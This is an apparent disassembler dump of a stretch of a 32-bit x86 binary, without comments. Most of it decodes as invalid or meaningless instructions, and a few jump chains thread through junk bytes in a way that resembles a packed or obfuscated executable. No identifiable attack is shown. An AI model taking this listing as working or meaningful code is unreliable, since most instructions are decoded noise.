  413e7c:	fdiv   QWORD PTR [ebx-0x648d07c2]
  413e82:	inc    esi
  413e83:	xchg   edx,eax
  413e84:	ins    DWORD PTR es:[edi],dx
  413e85:	out    0x3e,eax
  413e87:	fsub   DWORD PTR [ebx-0x64d2cbab]
  413e8d:	(bad)  
  413e8e:	cdq    
  413e8f:	popa   
  413e90:	fdiv   DWORD PTR [edi]
  413e92:	jmp    0x4ab34cbe
  413e97:	dec    edx
  413e98:	adc    eax,esi
  413e9a:	scas   al,BYTE PTR es:[edi]
  413e9b:	pushf  
  413e9c:	(bad)  
  413e9d:	int3   
  413e9e:	mov    bl,0xa7
  413ea0:	adc    esp,ebx
  413ea2:	retf   0x69b7
  413ea5:	arpl   WORD PTR [ebp-0x5f],cx
  413ea8:	push   0x5c
  413eaa:	jb     0x413eb9
  413eac:	out    0x5f,al
  413eae:	into   
  413eaf:	(bad)
  413eb2:	aam    0xd8
  413eb4:	lds    edi,FWORD PTR [edi]
  413eb6:	test   eax,0xfde5a2ae
  413ebb:	shl    DWORD PTR [esi],cl
  413ebd:	inc    edi
  413ebe:	loope  0x413e68
  413ec0:	inc    BYTE PTR [edx-0x3e]
  413ec3:	xor    BYTE PTR [edx+0x7a],0xa5
  413ec7:	inc    eax
  413ec8:	xlat   BYTE PTR ds:[ebx]
  413ec9:	cli    
  413eca:	int    0x99
  413ecc:	push   ds
  413ecd:	pop    edx
  413ece:	out    dx,eax
  413ecf:	fwait
  413ed0:	mov    edi,0xc89607cc
  413ed5:	out    dx,eax
  413ed6:	push   cs
  413ed7:	xchg   ebp,eax
  413ed8:	icebp  
  413ed9:	push   ecx
  413eda:	and    DWORD PTR [ecx+0x2c],ecx
  413edd:	(bad)  
  413ede:	lock jns 0x413e83
  413ee1:	adc    eax,0x44d4f332
  413ee6:	pop    esi
  413ee7:	pop    ds
  413ee8:	popf   
  413ee9:	pop    ds
  413eea:	stos   BYTE PTR es:[edi],al
  413eeb:	aaa    
  413eec:	or     bl,BYTE PTR [edi+0x14bbbf23]
  413ef2:	daa    
  413ef3:	cmp    eax,0xa2de986a
  413ef8:	out    dx,al
  413ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413efa:	lds    eax,FWORD PTR [edx+0x2c]
  413efd:	aad    0xd0
  413eff:	pop    esp
  413f00:	retf   0xf6e9
  413f03:	push   DWORD PTR [eax]
  413f05:	lea    eax,ds:0x426b9a
  413f0b:	push   DWORD PTR [eax]
  413f0d:	jmp    0x414418
  413f12:	les    edi,FWORD PTR ds:0xd9d9c9d3
  413f18:	fidivr DWORD PTR ds:0x94ead996
  413f1e:	out    dx,eax
  413f1f:	jl     0x413f17
  413f21:	pop    esi
  413f22:	push   esi
  413f23:	push   ds
  413f24:	jg     0x413f9e
  413f26:	push   0x7c
  413f28:	js     0x413fa2
  413f2a:	mov    BYTE PTR [ecx],ch
  413f2c:	pop    edx
  413f2d:	or     eax,0x53f85d0b
  413f32:	push   esi
  413f33:	icebp  
  413f34:	or     al,0xef
  413f36:	pop    eax
  413f37:	and    esi,DWORD PTR ds:0x1d69505f
  413f3d:	lea    esp,[ecx]
  413f3f:	imul   esi,DWORD PTR [ecx],0x57e6bab0
  413f45:	pop    ds
  413f46:	mov    al,ds:0xd81e7b31
  413f4b:	add    esi,DWORD PTR ds:0x1503af1e
  413f51:	jns    0x413eef
  413f53:	cli    
  413f54:	jle    0x413f17
  413f56:	jmp    0x40228e4d
  413f5b:	dec    ecx
  413f5c:	call   0x3130e9ab
  413f61:	pop    edx
  413f62:	push   ecx
  413f63:	inc    eax
  413f64:	sar    BYTE PTR [ebx+esi*8-0x12],0xf4
  413f69:	mov    edi,0xf8d3e583
  413f6e:	nop
  413f6f:	xchg   esi,eax
  413f70:	push   ebx
  413f71:	test   al,0x45
  413f73:	mov    ah,0xa4
  413f75:	push   edi
  413f76:	sbb    eax,0x2a00f846
  413f7b:	inc    edx
  413f7c:	pop    es
  413f7d:	xchg   edi,eax
  413f7e:	retf   0x9712
  413f81:	gs fs in eax,0xd0
  413f85:	leave  
  413f86:	inc    ebx
  413f87:	or     esp,DWORD PTR [edx]
  413f89:	mov    ds:0xf34bc028,eax
  413f8e:	xchg   DWORD PTR [ecx+0x62],esp
  413f91:	stos   BYTE PTR es:[edi],al
  413f92:	push   esi
  413f93:	mov    dh,0x4c
  413f95:	retf   
  413f96:	int3   
  413f97:	or     edi,DWORD PTR [esi+ecx*2-0x655c7e2c]
  413f9e:	cmp    al,0x51
  413fa0:	sbb    esi,ebx
  413fa2:	arpl   dx,si
  413fa4:	les    esp,FWORD PTR [edx]
  413fa6:	psllq  mm0,QWORD PTR [ecx-0x39]
  413faa:	enter  0x25c6,0xd4
  413fae:	push   es
  413faf:	out    0x51,eax
  413fb1:	cmp    BYTE PTR [eax+ecx*1-0x5c],ch
  413fb5:	sub    al,0x6e
  413fb7:	sbb    DWORD PTR [edi],ebp
  413fb9:	test   al,0x44
  413fbb:	lds    ebx,FWORD PTR [ebx]
  413fbd:	call   0x4416:0x6df4e4df
  413fc4:	out    0x2b,eax
  413fc6:	push   edi
  413fc7:	or     bl,BYTE PTR [esi+eiz*8+0x79946666]
  413fce:	pop    edx
  413fcf:	in     al,dx
  413fd0:	push   ecx
  413fd1:	dec    ebx
  413fd2:	inc    BYTE PTR [edx-0x25]
  413fd5:	add    BYTE PTR [edi+ebp*4+0x5c79ff8],ah
  413fdc:	mov    al,ds:0x8b023f81
  413fe1:	mov    edi,0x5dde7fa1
  413fe6:	scas   eax,DWORD PTR es:[edi]
  413fe7:	push   cs
  413fe8:	adc    al,0x9d
  413fea:	loop   0x414044
  413fec:	cmp    BYTE PTR [eax],bh
  413fee:	mov    DWORD PTR [eax+0x25cfe8c0],eax
  413ff4:	mov    eax,ds:0x230abee9
  413ff9:	fild   QWORD PTR [esi+0x2e6e9628]
  413fff:	repz xor DWORD PTR [ecx+0x5d],ebx
  414003:	mov    ds:0x81836d5,eax
  414008:	ss into 
  41400a:	nop
  41400b:	sahf   
  41400c:	sbb    BYTE PTR [edx-0xd],ah
  41400f:	cs das 
  414011:	outs   dx,DWORD PTR ds:[esi]
  414012:	mov    ebx,0xd27d1269
  414017:	xor    eax,0xd904a734
  41401c:	mov    ebx,0x48d34643
  414021:	cld    
  414022:	add    ch,al
  414024:	jne    0x414027
  414026:	das    
  414027:	sti    
  414028:	int3   
  414029:	(bad)  
  41402a:	inc    edi
  41402b:	push   es
  41402c:	stos   BYTE PTR es:[edi],al
  41402d:	xor    eax,DWORD PTR [ebp+0x75]
  414030:	or     DWORD PTR [ecx-0x54d1d4df],0xae242827
  41403a:	and    esi,eax
  41403c:	jp     0x414050
  41403e:	sti    
  41403f:	pop    ebx
  414040:	xchg   ecx,eax
  414041:	sub    edi,edi
  414043:	in     eax,dx
  414044:	xchg   edx,eax
  414045:	lods   eax,DWORD PTR ds:[esi]
  414046:	dec    ebx
  414047:	pop    ebx
  414048:	enter  0x7b67,0x29
  41404c:	call   0xb41e:0x6e8aa212
  414053:	into   
  414054:	cs ja  0x41401b
  414057:	enter  0xaf7e,0xb7
  41405b:	je     0x4140c3
  41405d:	or     bl,BYTE PTR [edi+0x8636c28]
  414063:	xor    DWORD PTR [ebp-0x1e7bd60c],ebx
  414069:	mov    esp,0xc9c52211
  41406e:	mov    DWORD PTR [edi+0x5587f1ec],ecx
  414074:	aaa    
  414075:	pop    ss
  414076:	jno    0x414039
  414078:	fldenv [eax+esi*8]
  41407b:	pop    esi
  41407c:	ficomp DWORD PTR [esi]
  41407e:	jbe    0x4140e1
  414080:	mov    al,ds:0xa74a787c
  414085:	push   ds
  414086:	popf   
  414087:	mov    dh,0x4c
  414089:	mov    cl,0xf1
  41408b:	bound  ecx,QWORD PTR [ebx+0x2105a146]
  414091:	div    DWORD PTR [ebp+0x3f09c483]
  414097:	(bad)  [edi+0x368d1258]
  41409d:	sbb    DWORD PTR [ecx+0x7b],edi
  4140a0:	or     al,0x54
  4140a2:	repnz fisubr WORD PTR [ebx-0x47]
  4140a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a7:	ja     0x414076
  4140a9:	int3   
  4140aa:	push   edx
  4140ab:	or     al,0xe1
  4140ad:	stos   BYTE PTR es:[edi],al
  4140ae:	and    cl,cl
  4140b0:	(bad)  
  4140b2:	mov    edi,0xe1da0e71
  4140b7:	aas    
  4140b8:	mov    eax,ds:0xfebb1cd7
  4140bd:	addr16 int 0x9c
  4140c0:	outs   dx,DWORD PTR ds:[esi]
  4140c1:	ds pop esi
  4140c3:	or     eax,0xbcc4cd26
  4140c8:	add    bh,bh
  4140ca:	inc    edx
  4140cb:	ret    0xdbbf
  4140ce:	inc    esp
  4140cf:	xor    eax,0x999c7644
  4140d4:	inc    eax
  4140d5:	xor    BYTE PTR [ebp-0x22],dl
  4140d8:	mov    esi,DWORD PTR [edx+0x22441573]
  4140de:	fisttp QWORD PTR [ebx]
  4140e0:	add    DWORD PTR [esi+0x646d8c45],0x4c9237a2
  4140ea:	add    eax,0xd36dec23
  4140ef:	gs popa 
  4140f1:	fucomp st(3)
  4140f3:	call   0x746bc22a
  4140f8:	add    BYTE PTR [esi-0x16],dh
  4140fb:	dec    esp
  4140fc:	xchg   BYTE PTR es:[eax+0x70],al
  414100:	jmp    0x2247:0x79ab9296
  414107:	mov    ds:0xc2595693,eax
  41410c:	mov    ecx,0x2b866fef
  414111:	add    edx,esp
  414113:	(bad)  
  414114:	adc    DWORD PTR [ecx+ebx*4],ebp
  414117:	out    0x1c,eax
  414119:	sub    al,0x2d
  41411b:	arpl   WORD PTR [eax-0x5f],cx
  41411e:	rcr    ebp,cl
  414120:	fsub   DWORD PTR [ebx+edx*1]
  414123:	jecxz  0x41418b
  414125:	in     al,0x8c
  414127:	or     edi,DWORD PTR [ecx]
  414129:	jns    0x414111
  41412b:	inc    edx
  41412c:	loop   0x4140cb
  41412e:	jg     0x41412a
  414130:	(bad)  
  414131:	fs push ss
  414133:	xor    ebp,edx
  414135:	adc    DWORD PTR [esi-0x48],0xf1acbb4c
  41413c:	mov    cl,0x4e
  41413e:	pushf  
  41413f:	outs   dx,DWORD PTR ds:[esi]
  414140:	or     BYTE PTR [ebx],ch
  414142:	sub    eax,0xa4b566d0
  414147:	ds add ch,ah
  41414a:	cli    
  41414b:	jge    0x4140dc
  41414d:	divps  xmm6,XMMWORD PTR [edx+0xf350dbe]
  414154:	pop    esi
  414155:	fcom   QWORD PTR [esi]
  414157:	mov    ecx,DWORD PTR [esi]
  414159:	jg     0x41411c
  41415b:	cdq    
  41415c:	loopne 0x4140f4
  41415e:	cdq    
  41415f:	call   0x8a723e5e
  414164:	pop    eax
  414165:	ret    
  414166:	cmc    
  414167:	xchg   ebx,ebp
  414169:	retf   0xc19d
  41416c:	retf   0xa480
  41416f:	aas    
  414170:	or     al,0x8e
  414172:	adc    BYTE PTR [eax+0x75590fc6],ah
  414178:	(bad)
  41417b:	cdq    
  41417c:	mov    cl,0x73
  41417e:	mov    dl,0x7b
  414180:	outs   dx,DWORD PTR ds:[esi]
  414181:	xchg   DWORD PTR [ebx-0x5f],ecx
  414184:	cmp    edx,DWORD PTR [edx]
  414186:	ds int 0x7a
  414189:	fisttp DWORD PTR [edx-0x71]
  41418c:	or     ebp,ecx
  41418e:	push   ds
  41418f:	add    al,bl
  414191:	je     0x414168
  414193:	aas    
  414194:	cmp    al,0xb6
  414196:	xor    ebx,DWORD PTR [edi+0x5feb9e63]
  41419c:	or     bl,bh
  41419e:	cdq    
  41419f:	neg    BYTE PTR [ebx+edi*4]
  4141a2:	push   es
  4141a3:	(bad)  
  4141a5:	int    0x39
  4141a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a8:	(bad)  
  4141aa:	loopne 0x414141
  4141ac:	mov    ecx,0x7085b3a1
  4141b1:	cmp    dh,dl
  4141b3:	xchg   BYTE PTR [ecx-0xf401135],bh
  4141b9:	in     eax,dx
  4141ba:	cmp    eax,0x2cc6f6d5
  4141bf:	mov    esi,0x5af90038
  4141c4:	in     al,dx
  4141c5:	mov    bl,0x6e
  4141c7:	cmp    eax,0x3fb70133
  4141cc:	jge    0x414163
  4141ce:	inc    esi
  4141cf:	int    0x96
  4141d1:	adc    DWORD PTR [ebx],esp
  4141d3:	and    DWORD PTR ds:0x6c9ae8e5,ebp
  4141d9:	rol    BYTE PTR [eax-0x17],cl
  4141dc:	pop    edi
  4141dd:	lock mov dl,BYTE PTR [eax+0x28a7752c]
  4141e4:	clc    
  4141e5:	jbe    0x414171
  4141e7:	ins    DWORD PTR es:[edi],dx
  4141e8:	dec    esp
  4141e9:	mov    cl,0x3c
  4141eb:	jle    0x41419b
  4141ed:	inc    ebp
  4141ee:	xchg   edi,eax
  4141ef:	mov    esi,0xd5a06fcd
  4141f4:	jne    0x41417c
  4141f6:	and    ebp,DWORD PTR [eax]
  4141f8:	pop    ds
  4141f9:	in     eax,dx
  4141fa:	aaa    
  4141fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141fc:	inc    esp
  4141fd:	mov    edi,0xc9f9681d
  414202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414203:	sub    ebx,DWORD PTR [edi+0x4891e24d]
  414209:	jmp    0x1aaade29
  41420e:	mul    bl
  414210:	mov    BYTE PTR [ecx+0x69],cl
  414213:	xor    DWORD PTR ds:0xb4ef0915,ecx
  414219:	sub    BYTE PTR ds:0x2cfb95be,bh
  41421f:	push   0xffffffc0
  414221:	stos   BYTE PTR es:[edi],al
  414222:	mov    al,0xcf
  414224:	xor    BYTE PTR [esi+edx*4],dl
  414227:	imul   edi,DWORD PTR [eax+0x465fb559],0x8
  41422e:	sbb    DWORD PTR [ecx+edi*2-0x7c3fc9fe],ebx
  414235:	dec    ebx
  414236:	std    
  414237:	pop    edi
  414238:	cmc    
  414239:	and    eax,edi
  41423b:	(bad)  
  41423c:	rol    DWORD PTR [esi-0x62dda153],cl
  414242:	and    ecx,DWORD PTR ds:0xb95e00b9
  414248:	lds    eax,FWORD PTR ds:0x2acd541a
  41424e:	xor    al,0xcc
  414250:	inc    ecx
  414251:	mov    edx,0xf97d860f
  414256:	sub    al,0xc0
  414258:	or     eax,0x4fb2bf11
  41425d:	cwde   
  41425e:	cld    
  41425f:	mov    bl,0xc7
  414261:	push   esp
  414262:	jno    0x414236
  414264:	int    0xd3
  414266:	add    eax,ebx
  414268:	imul   ebx,DWORD PTR [esi],0x6be40fd0
  41426e:	sub    ch,BYTE PTR [edx-0x26fbc3b]
  414274:	mov    ebp,0x4d7e4b34
  414279:	xor    al,0x83
  41427b:	mov    ds:0x5cec977b,al
  414280:	clc    
  414281:	inc    ebp
  414282:	pop    edi
  414283:	jge    0x414302
  414285:	mov    eax,0x6d2a0dc8
  41428a:	fsub   st(3),st
  41428c:	sbb    eax,0x3056fdb0
  414291:	iret   
  414292:	push   edx
  414293:	push   ebx
  414294:	out    0xf5,eax
  414296:	loop   0x4142c6
  414298:	sbb    al,0xc5
  41429a:	push   ds
  41429b:	push   ss
  41429c:	or     al,0xe5
  41429e:	std    
  41429f:	call   0x7557:0x1c901302
  4142a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a7:	aaa    
  4142a8:	ins    DWORD PTR es:[edi],dx
  4142a9:	jb     0x41426e
  4142ab:	hlt    
  4142ac:	xchg   esi,eax
  4142ad:	xchg   ebp,eax
  4142ae:	xchg   edi,eax
  4142af:	rol    DWORD PTR [eax],0xf8
  4142b2:	mov    ds:0xa618e9e5,al
  4142b7:	jecxz  0x414304
  4142b9:	sti    
  4142ba:	inc    esp
  4142bb:	ss ins DWORD PTR es:[edi],dx
  4142bd:	aad    0xfa
  4142bf:	or     ah,BYTE PTR [edi]
  4142c1:	fdiv   st,st(5)
  4142c3:	jge    0x4142da
  4142c5:	push   ss
  4142c6:	add    ecx,DWORD PTR [esp+ebp*1-0x32723817]
  4142cd:	fdiv   st,st(7)
  4142cf:	sub    BYTE PTR ds:0x5e09793d,cl
  4142d5:	mov    al,ds:0xd8f6a610
  4142da:	mov    eax,0xa284467e
  4142df:	sub    BYTE PTR [edx-0x3b],cl
  4142e2:	lock hlt 
  4142e4:	dec    esp
  4142e5:	test   al,0x17
  4142e7:	sub    ch,BYTE PTR [eax]
  4142e9:	or     DWORD PTR [ebp+0x29764a4f],0x5
  4142f0:	or     bl,bh
  4142f2:	xchg   DWORD PTR [edi+0x6316f680],eax
  4142f8:	fild   WORD PTR [ecx+0x571cb354]
  4142fe:	mov    ah,BYTE PTR [ecx+0x18f7b223]
  414304:	mov    ebp,0x39ecb97e
  414309:	push   0xffffffd5
  41430b:	das    
  41430c:	and    BYTE PTR [esp+eax*1],0x62
  414310:	aas    
  414311:	xchg   esi,eax
  414312:	jns    0x4142a9
  414314:	sbb    al,0xf4
  414316:	aas    
  414317:	lahf   
  414318:	aaa    
  414319:	xor    al,0x9d
  41431b:	outs   dx,BYTE PTR ds:[esi]
  41431c:	mov    cs,WORD PTR [ecx-0x77]
  41431f:	mov    cr3,eax
  414322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414323:	or     cl,BYTE PTR [ebp+0x4]
  414326:	shl    bh,0xea
  414329:	je     0x41433b
  41432b:	adc    eax,0xfcb08089
  414330:	inc    edx
  414331:	jmp    0x787ee735
  414336:	inc    ebx
  414337:	(bad)
  41433a:	or     al,0x1
  41433c:	ret    
  41433d:	mov    bh,0x72
  41433f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414340:	adc    DWORD PTR [edx],ebp
  414342:	scas   al,BYTE PTR es:[edi]
  414343:	shr    ecx,1
  414345:	inc    edi
  414346:	(bad)  
  414347:	sahf   
  414348:	pop    eax
  414349:	sbb    eax,esp
  41434b:	ins    DWORD PTR es:[edi],dx
  41434c:	bound  esp,QWORD PTR [edi+ebp*8]
  41434f:	icebp  
  414350:	jne    0x414300
  414352:	cmpxchg DWORD PTR ds:0x7bae64b0,ebp
  414359:	and    eax,0x6ff87be1
  41435e:	mov    fs,WORD PTR [eax]
  414360:	xor    BYTE PTR [ebp-0x15],0xc
  414364:	hlt    
  414365:	xchg   edi,eax
  414366:	shr    al,cl
  414368:	push   0x3c5842fd
  41436d:	mov    ah,ah
  41436f:	sbb    edi,ebx
  414371:	dec    ebx
  414372:	je     0x41436b
  414374:	fld    TBYTE PTR [ecx]
  414376:	xor    BYTE PTR [edi+0x15],bh
  414379:	pop    eax
  41437a:	and    esp,ecx
  41437c:	xor    dl,BYTE PTR [edi+0x1d8a0dca]
  414382:	dec    ebx
  414383:	adc    ebp,DWORD PTR [edi-0x75]
  414386:	inc    esi
  414387:	dec    edi
  414388:	mov    ds,WORD PTR [esi+ebx*4+0x50dfa1d2]
  41438f:	mov    esi,0x256dbc52
  414394:	pop    edi
  414395:	addr16 mov esi,esi
  414398:	dec    ebp
  414399:	and    edx,edx
  41439b:	pusha  
  41439c:	dec    esp
  41439d:	push   edx
  41439e:	(bad)  
  41439f:	call   0x324e:0x1b2aac6d
  4143a6:	leave  
  4143a7:	or     edx,eax
  4143a9:	in     al,dx
  4143aa:	imul   ebp,DWORD PTR [ebp-0x260744d2],0xffffffd6
  4143b1:	fs pop esp
  4143b3:	cli    
  4143b4:	or     eax,0xac6e0cca
  4143b9:	pushf  
  4143ba:	add    bl,ch
  4143bc:	rcl    DWORD PTR [eax],0x13
  4143bf:	ret    
  4143c0:	(bad)  
  4143c1:	sbb    WORD PTR [edx+edx*4-0x55],ax
  4143c6:	lods   al,BYTE PTR ds:[esi]
  4143c7:	int    0x7d
  4143c9:	jge    0x4143d1
  4143cb:	sub    eax,0x2c9b6990
  4143d0:	mov    bl,BYTE PTR [ebx]
  4143d2:	leave  
  4143d3:	pop    ss
  4143d4:	xor    cl,ch
  4143d6:	dec    ebp
  4143d7:	jnp    0x41439b
  4143d9:	sbb    eax,0xd7868ed1
  4143de:	(bad)  
  4143df:	mov    ebx,0x79a9d914
  4143e4:	lods   eax,DWORD PTR ds:[esi]
  4143e5:	lea    ebx,[eax]
  4143e7:	adc    BYTE PTR [ecx+0x17],dh
  4143ea:	or     eax,0xdf72441d
  4143ef:	push   cs
  4143f0:	mov    ds:0x2b84d575,eax
  4143f5:	data16 xor BYTE PTR [edx-0xd],cl
  4143f9:	cmp    DWORD PTR [esi],0xffffffd1
  4143fc:	and    eax,0xad37c48c
  414401:	popa   
  414402:	cmp    DWORD PTR es:[edi-0x48e35309],ebp
  414409:	cmp    al,0x6
  41440b:	out    dx,al
  41440c:	cwde   
  41440d:	sub    BYTE PTR [edi-0x23],cl
  414410:	sbb    eax,0x332f0caa
  414415:	mov    cs,WORD PTR [edi+0x75]
  414418:	lea    eax,ds:0x426c4a
  41441e:	push   DWORD PTR [eax]
  414420:	jmp    0x41492b
  414425:	(bad)  
  414426:	retf   0xd3ca
  414429:	leave  
  41442a:	rcl    ebp,cl
  41442c:	fcmovb st,st(7)
  41442e:	sub    DWORD PTR [edi-0x5daf2d74],ecx
  414434:	add    DWORD PTR [eax+0x21],eax
  414437:	jg     0x4144b1
  414439:	push   0x7c
  41443b:	js     0x4144b5
  41443d:	aas    
  41443e:	loopne 0x41443a
  414440:	mov    edx,0x602eb679
  414445:	adc    al,0x21
  414447:	mov    ebp,0x9d912627
  41444c:	jmp    FWORD PTR [ecx-0x6f]
  41444f:	mov    dl,0x58
  414451:	xchg   ebp,eax
  414452:	push   0x5f67fd7b
  414457:	xchg   edi,eax
  414458:	cmc    
  414459:	jg     0x4144b2
  41445b:	cmc    
  41445c:	mov    ch,0xc2
  41445e:	jmp    0x58aa:0x853b71fc
  414465:	sub    eax,0x2052a3a8
  41446a:	out    dx,al
  41446b:	jmp    0x6db3:0xde9f0866
  414472:	cmp    al,0x9e
  414474:	imul   esp,DWORD PTR [eax+eax*4],0xffffffab
  414478:	dec    edi
  414479:	dec    edi
  41447a:	inc    esi
  41447b:	and    DWORD PTR [ebx+0x8],edi
  41447e:	addr16 xor al,0xef
  414481:	jo     0x4144bb
  414483:	hlt    
  414484:	jmp    0x414460
  414486:	shr    BYTE PTR [ebx-0x535c36cf],0x8a
  41448d:	rol    al,1
  41448f:	int    0x69
  414491:	mov    ebx,DWORD PTR [edi]
  414493:	cmp    BYTE PTR [esi+0x7c],dh
  414496:	daa    
  414497:	mov    DWORD PTR [eax+ebp*8+0x1a],esp
  41449b:	or     eax,ebx
  41449d:	jecxz  0x41445e
  41449f:	lock jae 0x4144c7
  4144a2:	adc    eax,0x87718667
  4144a7:	scas   eax,DWORD PTR es:[edi]
  4144a8:	repnz stc 
  4144aa:	xchg   ecx,eax
  4144ab:	or     bh,al
  4144ad:	mov    eax,ds:0xd2953a64
  4144b2:	and    al,0x42
  4144b4:	xchg   edx,eax
  4144b5:	adc    dh,bh
  4144b7:	mov    al,0x13
  4144b9:	mov    ah,0xac
  4144bb:	and    eax,DWORD PTR [ebp-0x3c]
  4144be:	or     al,0xce
  4144c0:	aad    0xfd
  4144c2:	jne    0x4144c8
  4144c4:	arpl   WORD PTR [ecx-0x1a],bp
  4144c7:	arpl   di,ax
  4144c9:	out    dx,al
  4144ca:	in     al,0x5f
  4144cc:	pop    edx
  4144cd:	and    eax,0xdbcb3bf
  4144d2:	add    ebx,DWORD PTR [ebx]
  4144d4:	xor    ah,bh
  4144d6:	je     0x41451f
  4144d8:	or     BYTE PTR [ebx+0xfd339ba],ch
  4144de:	js     0x4144fc
  4144e0:	mov    esi,0x9088730d
  4144e5:	push   edi
  4144e6:	jae    0x4144e2
  4144e8:	cmp    DWORD PTR [ebp+0x48e39d5d],eax
  4144ee:	push   ebx
  4144ef:	mov    edx,0x763d9145
  4144f4:	fdivp  st(0),st
  4144f6:	mov    ebx,0x4d0cc5de
  4144fb:	xor    DWORD PTR [ecx-0x4c],0x9898c1c
  414502:	push   edx
  414503:	jae    0x41450c
  414505:	adc    al,0x65
  414507:	shl    edi,cl
  414509:	pop    edi
  41450a:	jecxz  0x41452e
  41450c:	rcr    DWORD PTR [edx],0x30
  41450f:	aad    0x56
  414511:	sbb    al,0x37
  414513:	arpl   WORD PTR [ebp-0x47],di
  414516:	add    DWORD PTR [esp+eiz*4],0xc95643ac
  41451d:	ds stos BYTE PTR es:[edi],al
  41451f:	inc    ebx
  414520:	ss mov dl,0x43
  414523:	add    DWORD PTR [edx+ecx*2+0x7ac50617],ebx
  41452a:	div    ch
  41452c:	(bad)  
  41452d:	stc    
  41452e:	jmp    0x9e5f:0xa1580742
  414535:	pop    esi
  414536:	outs   dx,DWORD PTR ds:[esi]
  414537:	(bad)  
  414538:	leavew 
  41453a:	mov    esp,0x525711b
  41453f:	xchg   dl,cl
  414541:	adc    cl,al
  414543:	fidiv  DWORD PTR [ebx]
  414545:	xchg   esp,eax
  414546:	dec    edi
  414547:	mov    esi,0x64b1517a
  41454c:	out    dx,eax
  41454d:	dec    eax
  41454e:	outs   dx,DWORD PTR ds:[esi]
  41454f:	imul   esi,DWORD PTR [edi],0xc7ecce85
  414555:	aam    0xea
  414557:	jo     0x4145d3
  414559:	ret    0xc604
  41455c:	adc    al,0xac
  41455e:	(bad)  
  41455f:	enter  0x4c3a,0x8
  414563:	ret    
  414564:	pop    ebx
  414565:	or     BYTE PTR [ecx-0x3c],ch
  414568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414569:	jb     0x414525
  41456b:	jecxz  0x4145ac
  41456d:	xchg   ecx,eax
  41456e:	cmc    
  41456f:	and    DWORD PTR [esp+edx*1+0x7baea74b],ebp
  414576:	fwait
  414577:	add    esp,DWORD PTR [eax-0x2536dffb]
  41457d:	adc    al,0x6f
  414580:	je     0x41457c
  414582:	mov    ds:0xd37fb15,al
  414587:	in     al,dx
  414588:	lds    esi,FWORD PTR [eax+0x26]
  41458b:	daa    
  41458c:	inc    ebp
  41458d:	in     eax,0x26
  41458f:	mov    eax,0x4585aa7d
  414594:	fmul   st(5),st
  414596:	jle    0x414617
  414598:	std    
  414599:	mov    ds:0x389cc1f3,eax
  41459e:	imul   BYTE PTR [esp+edx*8+0x72ce6a40]
  4145a5:	test   DWORD PTR [ecx+0x5],edi
  4145a8:	sub    ebx,DWORD PTR [ebx-0x69]
  4145ab:	repz adc cl,BYTE PTR [esp+eax*4]
  4145af:	sub    al,0xc9
  4145b1:	or     dh,BYTE PTR [edi+ecx*4+0x20]
  4145b5:	aas    
  4145b6:	jae    0x414609
  4145b8:	mov    cl,0x41
  4145ba:	bndldx bnd3,[esi-0x2c]
  4145be:	cmp    al,0x13
  4145c0:	in     al,0xa3
  4145c2:	test   al,0x99
  4145c4:	in     eax,dx
  4145c5:	aam    0x4c
  4145c7:	cdq    
  4145c8:	pop    ss
  4145c9:	pop    ecx
  4145ca:	add    al,bl
  4145cc:	push   0xffffffa6
  4145ce:	sar    BYTE PTR [eax],1
  4145d0:	(bad)  
  4145d1:	test   BYTE PTR [eax+0x37],0x43
  4145d5:	xchg   ebx,eax
  4145d6:	xchg   esi,eax
  4145d7:	in     al,0x67
  4145d9:	or     eax,0xf183c266
  4145de:	test   eax,0xf2f4dc4f
  4145e3:	pop    edi
  4145e4:	cmp    ecx,DWORD PTR [edx-0x3ac6f6f9]
  4145ea:	jmp    0xd9cb:0x23bb14db
  4145f1:	push   edx
  4145f2:	inc    eax
  4145f3:	cdq    
  4145f4:	sbb    al,0x96
  4145f6:	mov    WORD PTR [ecx+0x756e3b5e],fs
  4145fc:	cld    
  4145fd:	jp     0x4145a0
  4145ff:	das    
  414600:	rcl    BYTE PTR [ecx],1
  414602:	enter  0x37bf,0x47
  414606:	adc    eax,0x2c000df8
  41460b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41460c:	sbb    DWORD PTR [edi+edi*4-0x27],ebx
  414610:	(bad)  
  414611:	and    BYTE PTR [ebx-0x3d],dh
  414614:	fmul   DWORD PTR [eax]
  414616:	fldenv [ecx]
  414618:	cmp    al,BYTE PTR [edx+0x2d]
  41461b:	push   es
  41461c:	mov    ecx,0x13c6881a
  414621:	scas   al,BYTE PTR es:[edi]
  414622:	add    al,al
  414624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414625:	sbb    ebp,DWORD PTR [esi-0x1c4f59f0]
  41462b:	stos   BYTE PTR es:[edi],al
  41462c:	or     cl,dl
  41462e:	ret    0x5b1
  414631:	push   edi
  414632:	pop    ebx
  414633:	sbb    BYTE PTR [ebx-0x7a],cl
  414636:	sub    al,0xd4
  414639:	aas    
  41463a:	push   cs
  41463b:	stc    
  41463c:	dec    esp
  41463d:	add    dl,0xc3
  414640:	jne    0x4146b7
  414642:	or     esi,DWORD PTR [ebp+0x7d]
  414645:	aad    0x57
  414647:	test   DWORD PTR [ebx],esp
  414649:	pop    esp
  41464a:	pop    ss
  41464b:	mov    edx,0x62b14595
  414650:	or     ch,BYTE PTR [esi]
  414652:	loope  0x41467c
  414654:	sub    esp,DWORD PTR ds:0xf3ec00ad
  41465a:	call   0x65de0acf
  41465f:	fsub   QWORD PTR [ecx+0x30347bc3]
  414665:	shl    ch,0xbd
  414668:	sub    esi,DWORD PTR [ebp+0x17]
  41466b:	in     al,0x8e
  41466d:	pop    ecx
  41466e:	push   es
  41466f:	test   BYTE PTR [edx-0x61bce44],dh
  414675:	icebp  
  414676:	push   eax
  414677:	idiv   BYTE PTR [ebp*1+0x4d7179d]
  41467e:	jns    0x414600
  414680:	les    ebp,FWORD PTR [ebx+edi*4-0x5bc96fea]
  414687:	mov    eax,esp
  414689:	xchg   BYTE PTR [eax+esi*4+0x2c],ah
  41468d:	sub    eax,0x440d0933
  414692:	test   dl,0x99
  414695:	div    BYTE PTR [edi]
